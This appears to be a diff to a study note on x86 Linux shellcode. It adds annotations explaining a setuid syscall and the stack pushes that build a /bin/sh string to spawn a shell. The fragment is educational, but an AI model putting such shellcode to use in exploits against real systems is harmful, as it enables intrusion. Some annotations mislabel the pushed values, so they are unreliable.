@@ -25,3 +25,16 @@ b:  68 6e 2f 73 68          push   0x68732f6e
 1b: 8d 42 0b                lea    eax,[edx+0xb]
 1e: cd 80                   int    0x80 
 ```
+Breakdown-
+
+```x86assembly
+xor    eax,eax ; zero's out the eax register
+mov    ebx,eax
+mov    al,0x17
+int    0x80
+
+;Pushed the text "\bin\sh" onto the stack which spawns the sh shell
+
+push   0x68732f6e - little endian hex code "\sh"
+push   0x69622f2f - little endian hex code "\bin"
+```
